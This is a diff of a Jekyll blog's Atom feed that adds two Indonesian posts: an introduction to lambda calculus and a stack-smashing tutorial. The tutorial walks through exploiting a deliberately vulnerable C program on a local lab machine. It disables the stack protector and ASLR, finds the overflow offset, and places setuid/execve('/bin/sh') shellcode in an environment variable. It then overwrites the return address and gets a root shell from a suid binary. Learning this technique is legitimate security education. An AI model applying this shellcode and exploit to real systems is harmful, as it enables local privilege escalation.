@@ -1,4 +1,1054 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-04-07T08:10:28+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">DXH30</title><subtitle>DXH30 website for Programming and CTF's Write Ups. and History for github Projects</subtitle><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2019/04/07/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2019-04-07T01:09:15+08:00</published><updated>2019-04-07T01:09:15+08:00</updated><id>http://localhost:4000/jekyll/update/2019/04/07/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2019/04/07/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-04-14T02:35:01+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">DXH30</title><subtitle>DXH30 website for Programming and CTF's Write Ups. and History for github Projects</subtitle><entry><title type="html">Lambda Calculus Ep 1</title><link href="http://localhost:4000/jekyll/update/2019/04/13/tutorial-lambda-calculus-1.html" rel="alternate" type="text/html" title="Lambda Calculus Ep 1" /><published>2019-04-13T00:00:00+08:00</published><updated>2019-04-13T00:00:00+08:00</updated><id>http://localhost:4000/jekyll/update/2019/04/13/tutorial-lambda-calculus-1</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2019/04/13/tutorial-lambda-calculus-1.html">&lt;p&gt;Lambda Calculus merupakan teori yang berkaitan erat dengan Turing Machine. Dimana Lambda Calculus ini menyerupai Turing Machine dalam sisi Algoritma. Secara ekspresi Lambda Calculus memiliki tiga konstruksi yang disebut &lt;strong&gt;Variabel&lt;/strong&gt;, &lt;strong&gt;Abstraksi&lt;/strong&gt;, dan &lt;strong&gt;Aplikasi&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Syntax&lt;/th&gt;
+      &lt;th&gt;Nama&lt;/th&gt;
+      &lt;th&gt;Deskripsi&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;x&lt;/td&gt;
+      &lt;td&gt;Variabel&lt;/td&gt;
+      &lt;td&gt;Karakter atau kata yang memiliki nilai&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;(\x.M)&lt;/td&gt;
+      &lt;td&gt;Abstraksi&lt;/td&gt;
+      &lt;td&gt;Definisi Fungsi&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;(M N)&lt;/td&gt;
+      &lt;td&gt;Aplikasi&lt;/td&gt;
+      &lt;td&gt;Menerapkan fungsi&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Agar dapat memahami Lambda, berikut adalah penjelasan singkatnya. (Di Lambda Calculus tidak ada + - x /, disini hanya untuk kemudahan penjelasan)&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;No&lt;/th&gt;
+      &lt;th&gt;Matematika&lt;/th&gt;
+      &lt;th&gt;Lambda&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;1&lt;/td&gt;
+      &lt;td&gt;f(x) = x&lt;/td&gt;
+      &lt;td&gt;\x.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;2&lt;/td&gt;
+      &lt;td&gt;f(x) = x + 1&lt;/td&gt;
+      &lt;td&gt;\x.x+1&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;3&lt;/td&gt;
+      &lt;td&gt;f(x) = x^2 + 1&lt;/td&gt;
+      &lt;td&gt;\x.x^2+1&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;4&lt;/td&gt;
+      &lt;td&gt;f(x,y) = x^2 + y^2&lt;/td&gt;
+      &lt;td&gt;\x.(\y.(x^2 + y^2))&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;5&lt;/td&gt;
+      &lt;td&gt;f(x,y,z) = x + y^2 + z^3&lt;/td&gt;
+      &lt;td&gt;\x.(\y.(\z.(x + y^2 + z^3)))&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Di persamaan no 4 dan 5, kenapa f(x,y) = x^2 + y^2, menjadi \x.(\y.(x^2 + y^2)) ? Saya perjelas ya.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;f(x, y) = x + y
+ini dapat dituliskan dalam bentuk
+
+f(x) = f(y) = x + y
+
+lah kok ? dapat darimana itu ? kasih contoh aja langsung
+x = 1, y = 2
+
+f(1) = f(2) = (1) + (2)
+
+maka hasilnya f(x) = 3, jika y juga terdefinisi
+
+mungkin akan lebih mudah dipahami kalau bentuknya dikurung seperti ini
+
+f(x) = (f(y) = x + y)
+
+atau mungkin karena ada 2 = (samadengan) jadi aneh, yaudah, coba bentuk ini
+
+f(x) = f(y)
+
+Perlu diketahui bahwa pada fungsi lambda setiap notasi fungsi tidak terdefinisi (anonymous function), jadi f pada f(x) berbeda dengan f pada f(y).
+
+Sehingga akan lebih mudah dipahami dalam bentuk seperti ini (f(y) diganti g(y))
+
+f(x) = g(y)
+
+dimana g(y) = x + y
+
+sehingga
+
+f(x) = x + y
+
+dan kita bisa mendefinisikan y pada g(y) dan x pada f(x), sehingga sama saja dengan
+
+f(x,y) = x + y
+
+f(x) = (g(y) = (x + y))
+
+Sehingga masuk akal jika kita buat dengan notasi berikut
+
+\x.(\y.(x + y))
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Oke untuk pendahuluan Lambda singkatnya seperti itu, mungkin tutorial selanjutnya, akan diperjelas&lt;/p&gt;
+&lt;div id=&quot;disqus_thread&quot;&gt;&lt;/div&gt;
+&lt;script&gt;
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-dxh30-tech-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+&lt;/script&gt;
+
+&lt;noscript&gt;Please enable JavaScript to view the &lt;a href=&quot;https://disqus.com/?ref_noscript&quot;&gt;comments powered by Disqus.&lt;/a&gt;&lt;/noscript&gt;</content><author><name>Didik</name></author><summary type="html">Lambda Calculus merupakan teori yang berkaitan erat dengan Turing Machine. Dimana Lambda Calculus ini menyerupai Turing Machine dalam sisi Algoritma. Secara ekspresi Lambda Calculus memiliki tiga konstruksi yang disebut Variabel, Abstraksi, dan Aplikasi.</summary></entry><entry><title type="html">Stack Smashing Sederhana</title><link href="http://localhost:4000/jekyll/update/2019/04/12/stack-smashing-sederhana.html" rel="alternate" type="text/html" title="Stack Smashing Sederhana" /><published>2019-04-12T00:00:00+08:00</published><updated>2019-04-12T00:00:00+08:00</updated><id>http://localhost:4000/jekyll/update/2019/04/12/stack-smashing-sederhana</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2019/04/12/stack-smashing-sederhana.html">&lt;p&gt;Stack smashing merupakan teknik yang dapat digunakan untuk bisa berkeliaran diluar fungsi atau variabel. Langsung saja kita ke tutorial stack smashing. Diketahui kode berikut ini : beri nama oke.c&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#define BATASAN 500
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Berikut ini adalah programnya&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BATASAN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Terbaca %d, isinya : %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dari kode diatas dapat dilihat batasan kita masukin nilai c nya adalah 500, sehingga ketika kita menginputkan buf lebih dari 80, yang 520 nya kemana ? coba kita compile, dan lihat apa yang terjadi (Matikan dulu stack protectornya dan ASLR), dengan mengikuti perintah berikut ini :&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; gcc &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; oke.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; oke
+&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
+&lt;span class=&quot;go&quot;&gt;[sudo] password for	user:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~#&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;0 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/sys/kernel/randomize_va_space
+&lt;span class=&quot;gp&quot;&gt;user@localhost:~#&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dari kode diatas dapat dilihat batasan kita masukin nilai c nya adalah 500, sehingga ketika kita menginputkan buf lebih dari 80, yang 420 nya kemana ? coba kita compile, dan lihat apa yang terjadi (Matikan dulu stack protectornya dan ASLR), dengan mengikuti perintah berikut ini :&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; gcc &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; execstack oke.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; oke
+&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
+&lt;span class=&quot;go&quot;&gt;[sudo] password for	user:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~#&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;0 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/sys/kernel/randomize_va_space
+&lt;span class=&quot;gp&quot;&gt;user@localhost:~#&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Untuk memastikan stack protector mati. Coba jalankan programnya dan masukkan inputan A 80, 100, 200, sampai 300 kali, dan terus tambah sampai core dumped. Abaikan karakter aneh di paling kanan. Ini juga merupakan cara untuk mengetahui byte offset sebelum Terjadi segmentation fault. Dalam case ini saya dapati byte offsetnya ada di byte ke 104, karena pada byte 105 dia Segmentation Fault (Dengan cara coba-coba :D).&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; ./oke
+&lt;span class=&quot;go&quot;&gt;Berikut ini adalah programnya
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Terbaca 80, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; ./oke
+&lt;span class=&quot;go&quot;&gt;Berikut ini adalah programnya
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Terbaca 100, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; ./oke
+&lt;span class=&quot;go&quot;&gt;Berikut ini adalah programnya
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Terbaca 105, isinnya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhy
+Segmentation fault (core dumped)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Kalau mau gampang menggunakan perl inline dan outputnya di copas saat input data pada program oke&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print(&quot;A&quot;x105);}'&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; ./oke
+&lt;span class=&quot;go&quot;&gt;Berikut ini adalah programnya
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Terbaca 105, isinnya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhy
+Segmentation fault (core dumped)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Atau cara yang lebih cepat, dengan cara memetakan keluaran dari perintah perl sebagai STDIN untuk perintah ./oke dengan menggunakan piping perintah&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print(&quot;A&quot;x105);}'&lt;/span&gt; | ./oke
+&lt;span class=&quot;go&quot;&gt;Terbaca 105, isinnya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhy
+Segmentation fault (core dumped)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Setelah kita mengetahui byte offsetnya kita bisa pakai untuk buat struktur exploitnya. Pertama-tama kita cari cara untuk menjalankan execve(“/bin/sh”);
+Dapat diperoleh &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-806.php&quot;&gt;disini&lt;/a&gt;, dibagian code[].&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cara menggunakan shellcode diatas adalah dengan cara menambahkannya pada environment variable. Kemudian alamat dari envar pada ./oke akan di cari dengan menggunakan getenvaddr&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; git clone https://github.com/historypeats/getenvaddr
+&lt;span class=&quot;go&quot;&gt;Cloning into 'getenvaddr'...
+remote: Enumerating objects: 18, done.
+remote: Counting objects: 100% (18/18), done.
+remote: Compressing objects: 100% (13/13), done.
+remote: Total 18 (delta 4), reused 18 (delta 4), pack-reused 0
+Unpacking objects: 100% (18/18), done.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; gcc ./getenvaddr/getenvaddr.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gea
+&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PWN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{printf(&quot;\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05&quot;);}'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; ./gea PWN ./oke
+&lt;span class=&quot;go&quot;&gt;PWN will be at 0x7fffffffe4a7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Kita buat file untuk input, dari ./oke, dan kita tahan dengan menggunakan cat&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print(&quot;A&quot;x104,&quot;\xa7\xe4\xff\xff\xff\x7f&quot;);}'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;.txt
+&lt;span class=&quot;gp&quot;&gt;user@localhost;&lt;/span&gt;~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;.txt &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | ./oke
+&lt;span class=&quot;go&quot;&gt;Berikut ini adalah programnya
+Terbaca 112, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn
+id
+uid=1000(user) gid=1000(user) groups=1000(user),90(network),98(power),991(lp),998(wheel)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lalu kita ubah agar program berjalan dengan suid root.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo chown &lt;/span&gt;root:root ./oke
+&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo chmod &lt;/span&gt;4755 ./oke
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Kita coba lagi&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;.txt &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | ./oke
+&lt;span class=&quot;go&quot;&gt;Berikut ini adalah programnya
+Terbaca 112, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp
+id
+uid=0(root) gid=1000(user) groups=1000(user),90(network),98(power),991(lp),998(wheel)
+^C
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;sumber&quot;&gt;Sumber&lt;/h1&gt;
+&lt;p&gt;Untuk shellcodenya dapat diperoleh &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-77.php&quot;&gt;disini&lt;/a&gt;
+Untuk getenvaddr dapat diperoleh &lt;a href=&quot;https://github.com/historypeats/getenvaddr&quot;&gt;disini&lt;/a&gt;
+Sumber bahasa inggris (lebih pro) &lt;a href=&quot;https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/&quot;&gt;disini&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;note&quot;&gt;Note&lt;/h1&gt;
+&lt;p&gt;Untuk tutorial bahasa inggris shellcodenya pada distro tertentu tidak dapat digunakan, bedanya shellcode disini menggunakan setuid(0) + execve(“/bin/sh”);&lt;/p&gt;
+&lt;div id=&quot;disqus_thread&quot;&gt;&lt;/div&gt;
+&lt;script&gt;
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
